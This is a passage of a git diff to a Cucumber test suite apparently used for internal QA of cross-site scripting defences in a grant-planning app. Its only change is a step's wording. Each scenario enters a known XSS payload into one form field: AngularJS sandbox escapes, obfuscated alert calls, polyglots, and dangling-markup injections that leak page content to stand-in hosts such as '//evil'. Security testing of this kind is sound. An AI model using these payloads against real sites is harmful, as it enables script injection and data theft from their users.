       | {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')() | fieldAssistanceType__c |
@@ -14580,7 +14580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                | Field                  |
       | {}.")));alert(1)//"; | fieldAssistanceType__c |
@@ -14605,7 +14605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | 'a'.constructor.prototype.charAt=[].join;[1]  \|orderBy:'x=1} } };alert(1)//'; | fieldAssistanceType__c |
@@ -14630,7 +14630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | {y:''.constructor.prototype}.y.charAt=[].join;[1] \|orderBy:'x=alert(1)' | fieldAssistanceType__c |
@@ -14655,7 +14655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
       | constructor.constructor('alert(1)')() | fieldAssistanceType__c |
@@ -14680,7 +14680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                    | Field                  |
       | toString().constructor.prototype.charAt=[].join; [1,2] \|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) | fieldAssistanceType__c |
@@ -14705,7 +14705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                         | Field                  |
       | <input autofocus ng-focus="$event.composedPath() \|orderBy:'[].constructor.from([1],alert)'"> | fieldAssistanceType__c |
@@ -14730,7 +14730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                | Field                  |
       | <input id=x ng-focus=$event.composedPath() \|orderBy:'(z=alert)(1)'> | fieldAssistanceType__c |
@@ -14755,7 +14755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                          | Field                  |
       | <input autofocus ng-focus="$event.composedPath() /\|orderBy:'[].constructor.from([1],alert)'"> | fieldAssistanceType__c |
@@ -14780,7 +14780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                          | Field                  |
       | <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div> | fieldAssistanceType__c |
@@ -14805,7 +14805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                  |
       | <input ng-cut=$event.composedPath()\|orderBy:'(y=alert)(1)'> | fieldAssistanceType__c |
@@ -14830,7 +14830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                      | Field                  |
       | <body background="//evil? \n <table background="//evil? \n <table><thead background="//evil? \n <table><tbody background="//evil? \n <table><tfoot background="//evil? \n <table><td background="//evil? \n <table><th background="//evil? | fieldAssistanceType__c |
@@ -14855,7 +14855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | <link rel=stylesheet href="//evil? | fieldAssistanceType__c |
@@ -14880,7 +14880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                  |
       | <link rel=icon href="//evil? | fieldAssistanceType__c |
@@ -14905,7 +14905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | <meta http-equiv="refresh" content="0; http://evil? | fieldAssistanceType__c |
@@ -14930,7 +14930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                | Field                  |
       | <img src="//evil?<image src="//evil? | fieldAssistanceType__c |
@@ -14955,7 +14955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | <video><track default src="//evil? | fieldAssistanceType__c |
@@ -14980,7 +14980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                  |
       | <video><source src="//evil? | fieldAssistanceType__c |
@@ -15005,7 +15005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                  |
       | <audio><source src="//evil? | fieldAssistanceType__c |
@@ -15030,7 +15030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                  |
       | <input type=image src="//evil? | fieldAssistanceType__c |
@@ -15055,7 +15055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                        | Field                  |
       | <form><button style="width:100%;height:100%" type=submit formaction="//evil? | fieldAssistanceType__c |
@@ -15080,7 +15080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                               | Field                  |
       | <form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil? | fieldAssistanceType__c |
@@ -15105,7 +15105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                  |
       | <button form=x style="width:100%;height:100%;"><form id=x action="//evil? | fieldAssistanceType__c |
@@ -15130,7 +15130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                 | Field                  |
       | <object data="//evil? | fieldAssistanceType__c |
@@ -15155,7 +15155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                | Field                  |
       | <iframe src="//evil? | fieldAssistanceType__c |
@@ -15180,7 +15180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value               | Field                  |
       | <embed src="//evil? | fieldAssistanceType__c |
@@ -15205,7 +15205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                         | Field                  |
       | <form><button formaction=//evil>XSS</button><textarea name=x> | fieldAssistanceType__c |
@@ -15230,7 +15230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                  |
       | <button form=x>XSS</button><form id=x action=//evil target=' | fieldAssistanceType__c |
@@ -15255,7 +15255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                        | Field                  |
       | <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=" | fieldAssistanceType__c |
@@ -15280,7 +15280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                              | Field                  |
       | <form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=" | fieldAssistanceType__c |
@@ -15305,7 +15305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | <a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/ | fieldAssistanceType__c |
@@ -15330,7 +15330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                              | Field                  |
       | <embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAssistanceType__c |
@@ -15355,7 +15355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAssistanceType__c |
@@ -15380,7 +15380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                | Field                  |
       | <object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAssistanceType__c |
@@ -15405,7 +15405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                        | Field                  |
       | <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAssistanceType__c |
@@ -15430,7 +15430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | <input type=hidden type=image src="//evil?  in 'Records' | fieldAssistanceType__c |
@@ -15455,7 +15455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                            | Field                  |
       | javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> | fieldAssistanceType__c |
@@ -15480,7 +15480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                        | Field                  |
       | javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"onmouseover=/*&lt;svg/*/onload=alert()//> | fieldAssistanceType__c |
@@ -15505,7 +15505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                          | Field                  |
       | javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/PortSwiggerRes/)//'> | fieldAssistanceType__c |
@@ -15530,7 +15530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15555,7 +15555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15580,7 +15580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15605,7 +15605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                  |
       | ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15630,7 +15630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15655,7 +15655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15680,7 +15680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                  |
       | ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);// | fieldAssistanceType__c |
@@ -15705,7 +15705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15730,7 +15730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                      | Field                  |
       | ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15755,7 +15755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                      | Field                  |
       | ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15780,7 +15780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15805,7 +15805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15830,7 +15830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15855,7 +15855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                  | Field                  |
       | ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);// | fieldAssistanceType__c |
@@ -15880,7 +15880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                       | Field                  |
       | ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -15905,7 +15905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                   | Field                  |
       | ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -15930,7 +15930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                   | Field                  |
       | ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -15955,7 +15955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -15980,7 +15980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                       | Field                  |
       | ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -16005,7 +16005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                       | Field                  |
       | ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -16030,7 +16030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                               | Field                  |
       | ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAssistanceType__c |
@@ -16055,7 +16055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16080,7 +16080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                  |
       | ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16105,7 +16105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                  |
       | ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16130,7 +16130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                        | Field                  |
